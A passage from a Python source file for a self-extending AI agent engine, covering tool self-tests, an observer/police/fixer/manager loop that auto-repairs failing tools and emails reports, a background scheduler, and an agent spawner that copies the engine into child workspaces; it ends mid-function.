        if response and not response.upper().startswith("ERROR") and 0 < len(response) < 300:
            return response
    except Exception:
        pass
    return _generate_test_input_for_tool(tool)

def _self_test_one_registered_tool(tool):
    """
    Runs a single registered tool with a generated test input and reports
    pass/fail — but deliberately does NOT call update_tool_trust() or
    retire_tool() the way run_existing_tool()/run_tool_with_input() do.
    A synthetic self-test question is a stand-in, not necessarily
    representative of the tool's real usage; letting a bad synthetic test
    silently retire an otherwise-working tool would be a worse bug than
    the one this feature is meant to catch. Trust scores only move based
    on real usage, same as before this feature existed.
    Returns a dict: {id, idea, test_input, passed, detail}.
    """
    ttype = tool.get("type", "local")
    if ttype == "web":
        return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": "(n/a)",
                "passed": None, "detail": "Skipped — web tool, nothing to execute locally."}
    if ttype == "github":
        return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": "(n/a)",
                "passed": None, "detail": "Skipped — github-backed tool, not run during self-test."}
    if not tool.get("filepath") or not os.path.exists(tool["filepath"]):
        return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": "(n/a)",
                "passed": False, "detail": "Tool file missing on disk."}

    test_input = _generate_grounded_test_input_for_tool(tool)
    try:
        if tool.get("contract") == "json":
            payload = json.dumps({"input": test_input})
            result = subprocess.run(
                ["python3", tool["filepath"]],
                input=payload, capture_output=True, text=True, timeout=CODE_TIMEOUT_SECONDS,
                preexec_fn=_sandbox_limits if os.name != "nt" else None
            )
            if result.returncode != 0:
                return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": test_input,
                        "passed": False, "detail": "Non-zero exit: " + result.stderr[:300]}
            try:
                data = json.loads(result.stdout.strip())
                output = data.get("output", "")
            except Exception:
                return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": test_input,
                        "passed": False, "detail": "Output wasn't valid JSON: " + result.stdout[:200]}
        else:
            result = subprocess.run(
                ["python3", tool["filepath"]], capture_output=True, text=True,
                timeout=CODE_TIMEOUT_SECONDS,
                preexec_fn=_sandbox_limits if os.name != "nt" else None
            )
            if result.returncode != 0:
                return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": test_input,
                        "passed": False, "detail": "Non-zero exit: " + result.stderr[:300]}
            output = result.stdout

        ok = validate_tool_output(tool.get("idea", ""), output)
        return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": test_input,
                "passed": ok, "detail": output[:200] if ok else "AI judged output not reasonable: " + output[:200]}
    except subprocess.TimeoutExpired:
        return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": test_input,
                "passed": False, "detail": "Timed out after " + str(CODE_TIMEOUT_SECONDS) + "s."}
    except Exception as e:
        return {"id": tool["id"], "idea": tool.get("idea", ""), "test_input": test_input,
                "passed": False, "detail": "Exception: " + str(e)}

def _self_test_builtins():
    """
    Exercises the core built-in functions (not dynamically-registered
    tools) with fixed, safe, deterministic test inputs — a known-stable
    URL, a simple arithmetic expression, an allowed shell command. These
    don't need AI-generated test questions since their expected behavior
    is well understood and can be checked directly, which also means this
    part of the suite still runs even if the AI backend is fully down.
    Returns a list of the same {id, idea, test_input, passed, detail} shape
    used for registered tools, so both sections render the same way.
    """
    results = []

    try:
        r = calculate("12 * 7 - 4")
        passed = r.startswith("Result:") and "80" in r
        results.append({"id": "builtin:calculate", "idea": "arithmetic evaluator",
                         "test_input": "12 * 7 - 4", "passed": passed, "detail": r})
    except Exception as e:
        results.append({"id": "builtin:calculate", "idea": "arithmetic evaluator",
                         "test_input": "12 * 7 - 4", "passed": False, "detail": "Exception: " + str(e)})

    try:
        r = fetch_url("https://example.com")
        passed = not r.startswith("ERROR") and not r.startswith("Could not")
        results.append({"id": "builtin:fetch_url", "idea": "fetch a web page's content",
                         "test_input": "https://example.com", "passed": passed, "detail": r[:200]})
    except Exception as e:
        results.append({"id": "builtin:fetch_url", "idea": "fetch a web page's content",
                         "test_input": "https://example.com", "passed": False, "detail": "Exception: " + str(e)})

    try:
        r = check_website_bugs_basic("https://example.com")
        passed = "Bug report for" in r and "Could not reach" not in r
        results.append({"id": "builtin:check_website_bugs_basic", "idea": "HTTP-only website bug check",
                         "test_input": "https://example.com", "passed": passed, "detail": r[:200]})
    except Exception as e:
        results.append({"id": "builtin:check_website_bugs_basic", "idea": "HTTP-only website bug check",
                         "test_input": "https://example.com", "passed": False, "detail": "Exception: " + str(e)})

    try:
        r = run_command("pwd")
        passed = bool(r.strip())
        results.append({"id": "builtin:run_command", "idea": "run an allowed shell command",
                         "test_input": "pwd", "passed": passed, "detail": r.strip()[:200]})
    except Exception as e:
        results.append({"id": "builtin:run_command", "idea": "run an allowed shell command",
                         "test_input": "pwd", "passed": False, "detail": "Exception: " + str(e)})

    # send_email is intentionally NOT test-fired here — it would actually
    # send a real email on every self-test run, which is noisy and not
    # something a test suite should do silently. Its config is checked
    # instead, without sending anything.
    email_configured = bool(os.environ.get("AGENT_EMAIL")) and bool(os.environ.get("AGENT_APP_PASSWORD"))
    results.append({"id": "builtin:send_email", "idea": "send email via Gmail SMTP (config check only, not fired)",
                     "test_input": "(n/a)", "passed": email_configured if email_configured else None,
                     "detail": "AGENT_EMAIL/AGENT_APP_PASSWORD configured." if email_configured
                                else "Not configured — this is expected if you haven't set up email yet."})

    return results

def self_test_all():
    """
    Runs every registered tool plus the core built-in functions and prints
    a pass/fail report. This is read-only with respect to the trust
    system (see _self_test_one_registered_tool's docstring) — running
    this does not retire tools or change their trust scores, so it's safe
    to run as often as you like without risking your working tool set.
    Returns the full results list, so callers (like the 'selftest' command
    below) can also email it via the same formatter used for website bug
    reports' send path if they want a copy outside the console.
    """
    print("\n=== SELF-TEST: running every registered tool + built-in function ===")
    all_results = []

    print("\n-- Built-in functions --")
    builtin_results = _self_test_builtins()
    all_results.extend(builtin_results)
    for r in builtin_results:
        status = "SKIP" if r["passed"] is None else ("PASS" if r["passed"] else "FAIL")
        print("[" + status + "] " + r["id"] + " — " + r["detail"][:120])

    tools = load_tools_index()
    print("\n-- Registered tools (" + str(len(tools)) + ") --")
    for i, tool in enumerate(tools):
        print("(" + str(i + 1) + "/" + str(len(tools)) + ") testing " + tool["id"] + "...")
        r = _self_test_one_registered_tool(tool)
        all_results.append(r)
        status = "SKIP" if r["passed"] is None else ("PASS" if r["passed"] else "FAIL")
        print("  [" + status + "] " + r["detail"][:150])
        time.sleep(1)  # small pause between AI-backed tests to reduce rate-limit pressure

    passed = sum(1 for r in all_results if r["passed"] is True)
    failed = sum(1 for r in all_results if r["passed"] is False)
    skipped = sum(1 for r in all_results if r["passed"] is None)
    print("\n=== SELF-TEST COMPLETE: " + str(passed) + " passed, " + str(failed) +
          " failed, " + str(skipped) + " skipped (out of " + str(len(all_results)) + ") ===\n")
    return all_results

def format_self_test_report_for_email(results):
    """
    Same spirit as format_bug_report_for_email() — plain-Python formatting,
    no AI call, so the report can still be emailed even if the self-test
    run itself hit AI rate limits partway through.
    """
    passed = sum(1 for r in results if r["passed"] is True)
    failed = sum(1 for r in results if r["passed"] is False)
    skipped = sum(1 for r in results if r["passed"] is None)
    lines = ["Self-test run completed on " + time.strftime("%B %d, %Y at %I:%M %p") + ".",
             "", str(passed) + " passed, " + str(failed) + " failed, " + str(skipped) +
             " skipped, out of " + str(len(results)) + " total.", ""]
    if failed:
        lines.append("FAILURES:")
        for r in results:
            if r["passed"] is False:
                lines.append("- " + r["id"] + " (\"" + r["idea"][:80] + "\")")
                lines.append("  Tested with: " + str(r["test_input"])[:150])
                lines.append("  " + r["detail"][:250])
        lines.append("")
    if skipped:
        lines.append("SKIPPED:")
        for r in results:
            if r["passed"] is None:
                lines.append("- " + r["id"] + ": " + r["detail"][:150])
        lines.append("")
    lines.append("PASSED:")
    for r in results:
        if r["passed"] is True:
            lines.append("- " + r["id"])
    return "Self-test report — " + str(passed) + " passed / " + str(failed) + " failed", "\n".join(lines)

# ============================================================
# OBSERVER / POLICE / FIXER / MANAGER
# ============================================================
# Four coordinated roles, all reusing existing mechanisms rather than
# duplicating them:
#   OBSERVER — takes a snapshot of what's currently running (tool/agent
#              counts, self-test pass/fail tally). The "sees everything" role.
#   POLICE   — reuses self_awareness_check() (the existing security/code-
#              quality scanner) plus flags any tool self-test found failing.
#              The "enforces the rules" role.
#   FIXER    — reuses red_team_and_fix_one_tool() (the existing AI-patch-
#              and-verify loop the dreamer already uses for tool_fix
#              entries) to attempt a fix for each failing tool, but ONLY
#              applies a patch if it re-tests as passing first. A backup
#              of the original code is kept either way.
#   MANAGER  — runs the above three in order and compiles one report,
#              which is what actually gets emailed.
#
# IMPORTANT LIMITATION, stated plainly rather than glossed over:
# red_team_and_fix_one_tool() finds ITS OWN failing input via
# generate_adversarial_inputs() — it does not reuse the exact input that
# self-test found failing. In practice this usually still surfaces the
# same underlying bug, but there's no guarantee it reproduces the precise
# failure self-test saw. If it can't reproduce ANY failure for a tool that
# self-test flagged, Fixer reports that honestly instead of pretending to
# have fixed something it couldn't even reproduce.

MANAGER_TOOL_BACKUP_DIR = workpath("manager_fix_backups")
os.makedirs(MANAGER_TOOL_BACKUP_DIR, exist_ok=True)
MANAGER_INTERVAL_SECONDS = 6 * 60 * 60  # default: every 6 hours — see manager_loop() docstring for why
MANAGER_TICK_SECONDS = 30  # how often manager_loop() re-checks elapsed time / a live interval change

# If this many failing tools IN A ROW all reproduce the identical failure
# signature and none get fixed, _fixer_attempt_repairs() stops early instead
# of repeating the same doomed red_team_and_fix_one_tool() attempt on every
# remaining tool — see that function's docstring for why.
FIXER_CIRCUIT_BREAKER_THRESHOLD = 3

def _observer_snapshot(test_results):
    tools = load_tools_index()
    agents = load_agents_index()
    passed = sum(1 for r in test_results if r["passed"] is True)
    failed = sum(1 for r in test_results if r["passed"] is False)
    skipped = sum(1 for r in test_results if r["passed"] is None)
    return [
        str(len(tools)) + " tool(s) registered, " + str(len(agents)) + " agent(s) spawned.",
        "Self-test just now: " + str(passed) + " passed, " + str(failed) +
            " failed, " + str(skipped) + " skipped (out of " + str(len(test_results)) + ").",
    ]

def _police_review(test_results):
    notes = []
    try:
        sa_ok, sa_report = self_awareness_check()
        if not sa_ok:
            notes.append("Security/code self-check flagged something: " + sa_report)
    except Exception as e:
        notes.append("Could not run the security self-check: " + str(e))
    for r in test_results:
        if r["passed"] is False and not str(r["id"]).startswith("builtin:"):
            notes.append("Tool " + r["id"] + " (\"" + r["idea"][:80] + "\") is failing self-test: " + r["detail"][:150])
    return notes

_ENVIRONMENTAL_FAILURE_SIGNATURES = (
    "failed to reserve page summary memory",
    "runtime/panic.go",
    "fatal error: runtime: out of memory",
)

def _is_environmental_failure(error_text):
    """
    Recognizes the specific Go-runtime OOM signature that shows up when a
    subprocess can't even reserve virtual address space to start (see
    SANDBOX_MEMORY_MB comment above) — this is an infrastructure condition,
    not a bug in whatever tool happened to be running at the time. Used to
    short-circuit the fixer immediately instead of burning a full
    red_team_and_fix_one_tool() attempt (and the AI calls that go with it)
    on something no code patch could ever fix.
    """
    if not error_text:
        return False
    text = error_text.lower()
    return any(sig.lower() in text for sig in _ENVIRONMENTAL_FAILURE_SIGNATURES)

def _fixer_attempt_repairs(test_results):
    """
    For every registered (non-builtin) tool that self-test found failing,
    tries to reproduce and auto-fix it via the existing
    red_team_and_fix_one_tool() mechanism. A patch is only ever applied if
    it re-tests as passing — never blind. The pre-patch code is always
    backed up to MANAGER_TOOL_BACKUP_DIR first, whether or not the fix
    succeeds, so a bad patch can always be manually reverted.

    Circuit breaker: if FIXER_CIRCUIT_BREAKER_THRESHOLD consecutive tools
    all reproduce the SAME failure signature (same first ~80 chars of
    found_error) and none of them get fixed, that's a strong signal the
    failure is environmental (e.g. a ulimit/RLIMIT_AS too low for a Go
    subprocess to even start) rather than a per-tool code bug. In that
    case there's no point burning further red_team_and_fix_one_tool()
    attempts on every remaining tool — they'll all hit the same wall — so
    we stop early and flag it as one issue instead of N identical ones.
    """
    notes = []
    failing = [r for r in test_results if r["passed"] is False and not str(r["id"]).startswith("builtin:")]
    if not failing:
        return ["No failing tools to fix."]
    detail_by_id = {r["id"]: r.get("detail", "") for r in failing}
    failing_ids = [r["id"] for r in failing]
    tools_by_id = {t["id"]: t for t in load_tools_index()}
    recent_unfixed_signatures = []  # rolling window of found_error[:80] for consecutive unfixed failures
    env_hit_ids = []  # tools skipped outright because self-test already showed the env signature
    for i, tool_id in enumerate(failing_ids):
        tool = tools_by_id.get(tool_id)
        if not tool or tool.get("type") != "local" or not tool.get("filepath"):
            notes.append(tool_id + ": not a locally-fixable tool (github/web-backed), skipping.")
            continue
        # Fast path: the self-test result itself already shows the known
        # environmental OOM signature, so don't even bother running
        # red_team_and_fix_one_tool() (which would just reproduce the same
        # unfixable failure and burn an AI call/attempt cycle for nothing).
        if _is_environmental_failure(detail_by_id.get(tool_id, "")):
            env_hit_ids.append(tool_id)
            notes.append(tool_id + ": self-test failure matches the known environmental OOM signature "
                         "(subprocess couldn't reserve virtual memory) — not a code bug, skipping fix attempt.")
            continue
        try:
            original_code = read_file(tool["filepath"]) if os.path.exists(tool["filepath"]) else None
            fix_result = red_team_and_fix_one_tool(target_tool=tool)
            if not fix_result:
                notes.append(tool_id + ": could not reproduce any failure to fix against (self-test's failure may be input-specific) — needs manual review.")
                recent_unfixed_signatures = []  # different kind of outcome — doesn't count toward the breaker
                continue
            if original_code is not None:
                backup_path = os.path.join(MANAGER_TOOL_BACKUP_DIR, tool_id + "_" + str(int(time.time())) + ".py")
                write_file(backup_path, original_code)
            if fix_result["status"] == "fixed" and fix_result.get("new_code"):
                write_file(tool["filepath"], fix_result["new_code"])
                notes.append(tool_id + ": FIXED and patch applied. Original backed up to " + backup_path + ".")
                recent_unfixed_signatures = []  # a real fix breaks any streak of identical failures
            else:
                error_sig = fix_result.get("found_error", "")[:80]
                notes.append(tool_id + ": reproduced a failure (" + fix_result.get("found_error", "")[:150] +
                              ") but could not generate a working fix after " + str(MAX_CODE_ATTEMPTS) + " attempts — needs manual review.")
                recent_unfixed_signatures.append(error_sig)
                if len(recent_unfixed_signatures) >= FIXER_CIRCUIT_BREAKER_THRESHOLD and \
                   len(set(recent_unfixed_signatures[-FIXER_CIRCUIT_BREAKER_THRESHOLD:])) == 1:
                    remaining = failing_ids[i + 1:]
                    notes.append(
                        str(FIXER_CIRCUIT_BREAKER_THRESHOLD) + " tools in a row reproduced the identical failure "
                        '("' + error_sig + '...") and none were fixable — this looks environmental '
                        "(e.g. a memory/ulimit constraint), not a per-tool code bug. Stopping early instead of "
                        "repeating the same doomed fix attempt on the remaining " + str(len(remaining)) +
                        " failing tool(s): " + ", ".join(remaining) + "."
                    )
                    break
        except Exception as e:
            notes.append(tool_id + ": fixer hit an unexpected error: " + str(e))
            recent_unfixed_signatures = []
    if len(env_hit_ids) >= 2:
        notes.append(
            str(len(env_hit_ids)) + " tool(s) hit the environmental OOM signature this pass "
            "(" + ", ".join(env_hit_ids) + "). If this keeps happening, raise SANDBOX_MEMORY_MB "
            "further — it's a fixed virtual-memory reservation cap for every sandboxed subprocess, "
            "not something any per-tool code fix can address."
        )
    return notes

def run_manager_pass(use_ai_test_questions=True, auto_email=True):
    """
    Runs Observer -> Police -> Fixer in order, compiles one unified
    report, prints it, and (if auto_email) emails it via the existing
    send_email() path. Returns the report text.
    use_ai_test_questions=False skips the per-tool AI-generated test
    question step in self-test (falls back to each tool's own idea text
    as the test input instead) — used by the automatic background loop to
    reduce AI API load, since this project already runs a dreamer thread
    and scheduler thread continuously competing for the same rate-limited
    keys. The on-demand 'systemcheck' command still uses the fuller
    AI-question version by default.
    """
    print("\n########## MANAGER: full system pass starting ##########")

    print("\n[OBSERVER + running self-test...]")
    if use_ai_test_questions:
        test_results = self_test_all()
    else:
        # Skip self_test_all()'s console printing/AI-question step and
        # run a lighter version: same runners, but test_input = tool idea
        # text directly instead of an extra ask_ai() call per tool.
        test_results = _self_test_builtins()
        for tool in load_tools_index():
            ttype = tool.get("type", "local")
            if ttype == "web":
                test_results.append({"id": tool["id"], "idea": tool.get("idea", ""), "test_input": "(n/a)",
                                      "passed": None, "detail": "Skipped — web tool, nothing to execute locally."})
                continue
            if ttype == "github":
                test_results.append({"id": tool["id"], "idea": tool.get("idea", ""), "test_input": "(n/a)",
                                      "passed": None, "detail": "Skipped — github-backed tool, not run during self-test."})
                continue
            r = _self_test_one_registered_tool(tool)
            test_results.append(r)

    observer_notes = _observer_snapshot(test_results)
    print("\n[POLICE: checking for rule/security violations...]")
    police_notes = _police_review(test_results)
    print("\n[FIXER: attempting repairs on anything failing...]")
    fixer_notes = _fixer_attempt_repairs(test_results)

    lines = ["FULL SYSTEM CHECK — " + time.strftime("%B %d, %Y at %I:%M %p"), ""]
    lines.append("OBSERVER (system snapshot):")
    lines.extend("  " + n for n in observer_notes)
    lines.append("")
    lines.append("POLICE (rule/security findings):")
    if police_notes:
        lines.extend("  " + n for n in police_notes)
    else:
        lines.append("  No issues found.")
    lines.append("")
    lines.append("FIXER (repair attempts):")
    lines.extend("  " + n for n in fixer_notes)
    report = "\n".join(lines)

    print("\n" + report)
    print("\n########## MANAGER: pass complete ##########\n")

    if auto_email:
        recipient = os.environ.get("AGENT_EMAIL")
        if recipient:
            fixed_count = sum(1 for n in fixer_notes if "FIXED and patch applied" in n)
            subject = "System check — " + str(len(police_notes)) + " issue(s), " + str(fixed_count) + " fixed"
            # The technical report above is Observer/Police/Fixer output —
            # useful, but not "what's my agent actually been doing" in plain
            # English. Appending build_activity_report() means every
            # automatic email also covers tools built, agents spawned/merged,
            # decisions made, lessons learned, schedules run, and AI usage
            # cost, without a separate email or a manual command needed.
            email_body = report + "\n\n" + build_activity_report()
            ok, err = send_email(recipient, subject, email_body)
            if ok:
                print("Report (system check + activity digest) emailed to " + recipient + ".")
            else:
                print("Could not email the report: " + str(err))
        else:
            print("AGENT_EMAIL not set — report was printed above but not emailed.")

    return report

def manager_loop():
    """
    Background counterpart to dreamer_loop()/scheduler_loop(), started
    the same way. Runs run_manager_pass() automatically every
    MANAGER_INTERVAL_SECONDS. Deliberately defaults to a LONG interval (6
    hours) rather than something tight like the scheduler's 30-second
    tick: a full pass runs self-test against every registered tool via
    subprocess + potentially several AI calls for the Fixer step, and this
    project already has a dreamer thread proposing/testing new tool ideas
    continuously — running this too often would compete hard for the same
    rate-limited AI keys and CPU. Only runs when the main thread isn't
    busy and at least one API key isn't currently rate-limited, same
    gating dreamer_can_act() already uses.

    BUG FIX: this used to do a single `time.sleep(MANAGER_INTERVAL_SECONDS)`
    per iteration. Since Python captures that value at the moment sleep()
    is called, a user running "systemcheck interval: <hours>" mid-wait had
    no effect until the CURRENT (stale, possibly hours-long) sleep finished
    — directly contradicting what the command's own confirmation message
    implied. Now sleeps in short MANAGER_TICK_SECONDS ticks and re-reads
    the live MANAGER_INTERVAL_SECONDS each tick, so a runtime interval
    change takes effect within one tick instead of up to 6 hours late.
    """
    elapsed = 0.0
    while True:
        time.sleep(MANAGER_TICK_SECONDS)
        elapsed += MANAGER_TICK_SECONDS
        if elapsed < MANAGER_INTERVAL_SECONDS:
            continue
        elapsed = 0.0
        try:
            if not _main_thread_busy.is_set() and keys_are_free():
                run_manager_pass(use_ai_test_questions=False, auto_email=True)
        except Exception as e:
            print("[manager] loop error: " + str(e))

# ============================================================
# SCHEDULER (recurring background tool runs)
# ============================================================

SCHEDULES_FILE = workpath("schedules.json")
SCHEDULER_TICK_SECONDS = 30   # how often the background loop checks for due schedules
_schedules_lock = threading.Lock()

def load_schedules():
    return read_json_file(SCHEDULES_FILE, [])

def save_schedules(schedules):
    write_file(SCHEDULES_FILE, json.dumps(schedules, indent=2))

def add_schedule(tool_id, interval_minutes):
    # BUG FIX: load_schedules()/save_schedules() used to each grab
    # _schedules_lock internally for just the read or just the write, not
    # across the whole read-modify-write in between. That's the same
    # lost-update race already fixed for tools_index.json/agents_index.json
    # elsewhere in this file — e.g. a background scheduler_loop tick and a
    # user's "schedule:"/"unschedule:" command could interleave and one
    # would silently undo the other. Locking internally inside
    # load/save also made this un-fixable from the caller side, since
    # threading.Lock() isn't reentrant — wrapping a call to load_schedules()
    # in `with _schedules_lock:` from here would have deadlocked the moment
    # load_schedules() tried to acquire the same lock again. Fixed by
    # moving the lock out to the call sites (matching the tools_index /
    # agents_index pattern) and holding it across the full operation here.
    tools = {t["id"]: t for t in load_tools_index()}
    if tool_id not in tools:
        return "No tool with id " + tool_id + ". Use 'tools' to list them."
    with _schedules_lock:
        schedules = load_schedules()
        if any(s["tool_id"] == tool_id for s in schedules):
            return "Tool " + tool_id + " is already scheduled. Use 'unschedule:" + tool_id + "' first to change it."
        schedules.append({
            "tool_id": tool_id,
            "interval_minutes": interval_minutes,
            "next_run": time.time() + interval_minutes * 60,
            "last_run": None,
            "last_result": None,
            "runs": 0
        })
        save_schedules(schedules)
    return "Scheduled " + tool_id + " to run every " + str(interval_minutes) + " minute(s)."

def remove_schedule(tool_id):
    with _schedules_lock:
        schedules = load_schedules()
        remaining = [s for s in schedules if s["tool_id"] != tool_id]
        if len(remaining) == len(schedules):
            return "No schedule found for " + tool_id + "."
        save_schedules(remaining)
    return "Unscheduled " + tool_id + "."

def list_schedules():
    schedules = load_schedules()
    if not schedules:
        return "No tools scheduled. Use 'schedule: <tool_id> | <minutes>' to add one."
    lines = []
    for s in schedules:
        eta_min = max(0, round((s["next_run"] - time.time()) / 60, 1))
        last = "never" if not s.get("last_run") else time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(s["last_run"]))
        lines.append(s["tool_id"] + " — every " + str(s["interval_minutes"]) + "m, next in ~" + str(eta_min) +
                     "m, runs=" + str(s.get("runs", 0)) + ", last_run=" + last)
    return "\n".join(lines)

def _run_due_schedules():
    """Checks all schedules and runs any that are due. Called from scheduler_loop."""
    schedules = load_schedules()
    if not schedules:
        return
    tools = {t["id"]: t for t in load_tools_index()}
    now = time.time()
    due = [s for s in schedules if now >= s["next_run"]]
    if not due:
        return

    # Run the due tools OUTSIDE the lock — run_existing_tool() can take a
    # long time (arbitrary subprocess), and we don't want add_schedule()/
    # remove_schedule() (called from the main thread on user commands) to
    # block on that. Results are collected here and merged in below.
    results = {}
    for s in due:
        tool = tools.get(s["tool_id"])
        if not tool:
            results[s["tool_id"]] = "ERROR: tool no longer exists"
            continue
        try:
            success, output = run_existing_tool(tool)
            results[s["tool_id"]] = ("OK: " if success else "FAILED: ") + str(output)[:300]
            print("\n[scheduler] ran " + s["tool_id"] + " -> " + ("success" if success else "failed"))
        except Exception as e:
            results[s["tool_id"]] = "ERROR: " + str(e)
            print("\n[scheduler] " + s["tool_id"] + " raised: " + str(e))

    # BUG FIX: this used to reuse the `schedules` snapshot taken at the top
    # of the function — before run_existing_tool() ran, which can take a
    # long time — and save it back verbatim. If a user ran "schedule:" or
    # "unschedule:" on the main thread while a due tool was still running
    # here, that change would get silently overwritten the moment this
    # stale snapshot was saved. Re-loading fresh under the lock right
    # before writing, and only applying the run results actually computed
    # above, closes that window (same fix already applied to
    # tools_index.json / agents_index.json elsewhere in this file).
    with _schedules_lock:
        current = load_schedules()
        changed = False
        for s in current:
            if s["tool_id"] in results:
                changed = True
                s["next_run"] = now + s["interval_minutes"] * 60
                s["last_run"] = now
                s["runs"] = s.get("runs", 0) + 1
                s["last_result"] = results[s["tool_id"]]
        if changed:
            save_schedules(current)

def scheduler_loop():
    """Background loop, started alongside dreamer_loop. Sleeps SCHEDULER_TICK_SECONDS
    between checks so it stays cheap even with many schedules registered."""
    while True:
        try:
            _run_due_schedules()
        except Exception as e:
            print("[scheduler] loop error: " + str(e))
        time.sleep(SCHEDULER_TICK_SECONDS)

# ============================================================
# SKILL GRAPH
# ============================================================

COUSAGE_FILE = workpath("tool_cousage.json")

def log_cousage(tool_ids_used_together):
    data = read_json_file(COUSAGE_FILE, {})
    unique_ids = list(dict.fromkeys(tool_ids_used_together))
    for i, a in enumerate(unique_ids):
        for b in unique_ids[i + 1:]:
            key = "|".join(sorted([a, b]))
            data[key] = data.get(key, 0) + 1
    write_file(COUSAGE_FILE, json.dumps(data, indent=2))

def suggest_new_combo():
    data = read_json_file(COUSAGE_FILE, {})
    index = {t["id"]: t["idea"] for t in load_tools_index()}
    if len(index) < 2:
        return "Not enough tools built yet."
    pairs_text = "\n".join(k.replace("|", " + ") + ": " + str(v) + " times" for k, v in data.items())
    tools_text = "\n".join(tid + ": " + idea for tid, idea in index.items())
    prompt = """Tools: """ + tools_text + """
Pairs used together: """ + (pairs_text if pairs_text else "(none)") + """
Suggest ONE useful new workflow combining two tools never used together. Reply in 2 sentences."""
    return ask_ai(prompt)

# ============================================================
# AGENT SPAWNER
# ============================================================

AGENTS_DIR = workpath("generated_agents")
AGENTS_INDEX_FILE = workpath("agents_index.json")
CHAIN_SUCCESS_FILE = workpath("chain_success_counts.json")
CHAIN_SPAWN_THRESHOLD = 3
os.makedirs(AGENTS_DIR, exist_ok=True)

def load_agents_index():
    return read_json_file(AGENTS_INDEX_FILE, [])

def save_agents_index(index):
    write_file(AGENTS_INDEX_FILE, json.dumps(index, indent=2))

# BUG FIX: same lost-update race as tools_index.json (see _tools_index_lock
# above) — spawn_agent_from_chain() and merge_agents() can both be reached
# from a worker thread inside run_goal_with_dependencies()'s ThreadPoolExecutor
# (handle_single_question -> chain success -> maybe_spawn_agent_from_chain),
# so two near-simultaneous spawns/merges could each save a stale snapshot
# of agents_index.json and erase each other's entry. The naming/AI/workspace-
# build work stays outside the lock (it's slow and doesn't need exclusivity);
# only the final read-modify-write is made atomic.
_agents_index_lock = threading.Lock()

def load_chain_successes():
    return read_json_file(CHAIN_SUCCESS_FILE, {})

def save_chain_successes(data):
    write_file(CHAIN_SUCCESS_FILE, json.dumps(data, indent=2))

def record_chain_success(tool_ids):
    """Increments success count for this ordered chain. Returns new count."""
    key = "->".join(tool_ids)
    data = load_chain_successes()
    data[key] = data.get(key, 0) + 1
    save_chain_successes(data)
    return data[key]

def _next_agent_id(agents):
    """
    Returns the next 'agent_N' id that has never been used, active or
    retired-via-merge. NOTE: len(agents) + 1 is NOT safe here — merge_agents()
    removes parent agents from the active index once merged, so after any
    merge the list shrinks and a length-based id can collide with a
    still-active agent. Scans the active index plus the merge log (which
    records every id ever assigned as either a merge result or a merged-away
    parent) for the highest id ever used.
    """
    max_n = 0
    for a in agents:
        m = re.match(r"^agent_(\d+)$", a.get("id", ""))
        if m:
            max_n = max(max_n, int(m.group(1)))
    for entry in load_merge_log():
        ids = [entry.get("new_agent_id", "")] + entry.get("merged_from", [])
        for aid in ids:
            m = re.match(r"^agent_(\d+)$", aid or "")
            if m:
                max_n = max(max_n, int(m.group(1)))
    return "agent_" + str(max_n + 1)

def build_agent_workspace(agent_name, purpose, agent_id, tool_ids, chain_steps):
    """
    Creates a full agent workspace by copying the current engine file with patched
    identity constants. The child agent gets the full engine (dreamer, chainer,
    tool registry, build workflow) scoped to its own subdirectory and purpose.
    Returns (workspace_dir, agent_script_path) or (None, None) on failure.
    """
    workspace = os.path.join(AGENTS_DIR, agent_name)
    os.makedirs(workspace, exist_ok=True)

    # Copy the full engine into the workspace
    this_file = os.path.abspath(__file__)
    agent_script = os.path.join(workspace, "agent.py")
    shutil.copy(this_file, agent_script)

    # Copy seed tools into the child workspace tool dir
    child_tools_dir = os.path.join(workspace, "generated_tools")
    os.makedirs(child_tools_dir, exist_ok=True)
    seed_index = []
    for step in chain_steps:
        fp = step.get("filepath", "")
        if fp and os.path.exists(fp):
            dest = os.path.join(child_tools_dir, os.path.basename(fp))
            shutil.copy(fp, dest)
            seed_index.append({
                "id": step["tool_id"],
                "idea": step["idea"],
                "filepath": dest,
                "type": "local",
                "contract": "plain",
                "good_runs": 3,
                "bad_runs": 0,
                "time_sensitive": False
            })
    if seed_index:
        write_file(
            os.path.join(workspace, "tools_index.json"),
            json.dumps(seed_index, indent=2)
        )

    # Build a focused system prompt for this agent's AI calls
    system_prompt = (
        "You are " + agent_name + ", a specialised AI agent. "
        "Purpose: " + purpose + ". "
        "You were created by combining these tools: " + ", ".join(tool_ids) + ". "
        "Focus all tool-building, dreaming, and responses on tasks related to your purpose. "
        "When suggesting new tool ideas, keep them relevant to: " + purpose
    )

    # Build identity override header — prepended to the copied engine
    # Uses raw string tricks to avoid escape issues
    header_lines = [
        "# ==========================================================\n",
        "# SPAWNED AGENT — auto-generated\n",
        "# Agent:   " + agent_name + "\n",
        "# Purpose: " + purpose + "\n",
        "# Parent tools: " + ", ".join(tool_ids) + "\n",
        "# ==========================================================\n",
        "import os as _bootstrap_os\n",
        "_bootstrap_os.chdir(_bootstrap_os.path.dirname(_bootstrap_os.path.abspath(__file__)))\n",
    ]

    agent_src = read_file(agent_script)

    # BUG FIX: these used to be literal .replace() calls matching the
    # PRISTINE STUB text ('AGENT_SYSTEM_PROMPT = ""', 'AGENT_NAME = "main"',
    # 'AGENT_PURPOSE = "General-purpose agent"'). That stub only exists in
    # the root main.py. Every spawned agent's own agent.py already has
    # those lines replaced with its OWN repr(...) values by the time it's
    # copied — so if a spawned (non-root) agent ever spawns its own child
    # (a grandchild agent), none of those literal patterns match anymore,
    # .replace() silently no-ops (it never raises on a missing match), and
    # the grandchild silently inherits its PARENT's name/purpose/system
    # prompt instead of getting its own. Using regex against whatever the
    # line's CURRENT value is (stub or already-injected) fixes this at any
    # nesting depth, not just for children of the root agent.
    agent_src = re.sub(r'^AGENT_SYSTEM_PROMPT = .*$',
                        lambda m: 'AGENT_SYSTEM_PROMPT = ' + repr(system_prompt),
                        agent_src, count=1, flags=re.MULTILINE)
    agent_src = re.sub(r'^AGENT_NAME = .*$',
                        lambda m: 'AGENT_NAME = ' + repr(agent_name),
                        agent_src, count=1, flags=re.MULTILINE)
    agent_src = re.sub(r'^AGENT_PURPOSE = .*$',
